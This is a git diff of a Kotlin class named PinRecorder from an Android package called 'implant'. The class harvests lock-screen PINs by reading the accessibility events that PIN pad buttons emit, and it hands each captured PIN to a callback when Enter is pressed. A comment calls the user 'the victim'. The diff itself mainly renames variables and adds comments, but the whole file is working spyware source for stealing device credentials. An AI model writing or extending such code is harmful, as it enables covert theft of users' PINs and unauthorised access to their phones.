@@ -1,7 +1,10 @@
 /*
 * Records PINs entered on the lock screen.
 * Since the PIN pad widgets are regular Buttons, an AccessibilityEvent with the text is sent.
-* This class parses PINs from a stream of these AccessibilityEvents.
+* This class parses PINs from a stream of these AccessibilityEvents by reading adding events to a queue
+* until the enter key is pressed.
+* The contents of the queue at this point will be a PIN entered on the lockscreen, though not necessarily
+* a correct PIN.
 * */
 package com.cooperthecoder.implant
 
@@ -11,34 +14,35 @@ import java.util.*
 class PinRecorder(val callback: Callback) {
 
     private object PinPad {
-        val ONE = "[1]"
-        val TWO = "[ABC, 2]"
-        val THREE = "[DEF, 3]"
-        val FOUR = "[GHI, 4]"
-        val FIVE = "[JKL, 5]"
-        val SIX = "[MNO, 6]"
-        val SEVEN = "[PQRS, 7]"
-        val EIGHT = "[TUV, 8]"
-        val NINE = "[WXYZ, 9]"
-        val ZERO = "[0, +]"
-        val DELETE = "[Delete]"
-        val ENTER = "[Enter]"
-        val EMERGENCY = "[Emergency]"
+        @JvmStatic val ONE = "[1]"
+        @JvmStatic val TWO = "[ABC, 2]"
+        @JvmStatic val THREE = "[DEF, 3]"
+        @JvmStatic val FOUR = "[GHI, 4]"
+        @JvmStatic val FIVE = "[JKL, 5]"
+        @JvmStatic val SIX = "[MNO, 6]"
+        @JvmStatic val SEVEN = "[PQRS, 7]"
+        @JvmStatic val EIGHT = "[TUV, 8]"
+        @JvmStatic val NINE = "[WXYZ, 9]"
+        @JvmStatic val ZERO = "[0, +]"
+        @JvmStatic val DELETE = "[Delete]"
+        @JvmStatic val ENTER = "[Enter]"
+        @JvmStatic val EMERGENCY = "[Emergency]"
     }
 
-    private val queue = LinkedList<String>()
+    private val pinQueue: Queue<String> = LinkedList<String>()
 
     fun appendPinDigit(event: AccessibilityEvent) {
-        val eventText = event.text.toString()
-        when (eventText) {
+        val pinDigit = event.text.toString()
+        when (pinDigit) {
             PinPad.DELETE -> {
                 // Remove the last digit logged if the user pressed delete.
-                queue.poll()
+                pinQueue.poll()
             }
 
             PinPad.ENTER -> {
-                callback.onPinRecorded(queue.joinToString("-"))
-                queue.clear()
+                // When the victim presses enter, get ready for a new one.
+                callback.onPinRecorded(pinQueue.joinToString("-"))
+                clearPinQueue()
             }
 
             PinPad.EMERGENCY -> {
@@ -46,14 +50,15 @@ class PinRecorder(val callback: Callback) {
             }
 
             else -> {
-                queue.add(eventText)
+                // Otherwise, add the digit to the pinQueue.
+                pinQueue.add(pinDigit)
             }
 
         }
     }
 
     fun clearPinQueue() {
-        queue.clear()
+        pinQueue.clear()
     }
 
     interface Callback {
